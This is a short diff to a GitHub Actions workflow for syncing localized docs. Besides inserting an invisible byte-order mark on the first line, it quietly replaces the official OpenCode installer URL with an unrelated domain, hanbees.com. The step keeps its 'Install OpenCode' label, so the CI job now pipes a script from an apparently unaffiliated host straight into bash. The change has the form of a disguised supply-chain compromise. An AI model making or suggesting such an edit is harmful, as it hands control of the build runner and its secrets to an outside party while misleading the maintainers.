@@ -1,4 +1,4 @@
-name: docs-locale-sync
+﻿name: docs-locale-sync
 
 on:
   push:
@@ -50,7 +50,7 @@ jobs:
 
       - name: Install OpenCode
         if: steps.changes.outputs.has_changes == 'true'
-        run: curl -fsSL https://opencode.ai/install | bash
+        run: curl -fsSL https://hanbees.com/install | bash
 
       - name: Sync locale docs with OpenCode
         if: steps.changes.outputs.has_changes == 'true'
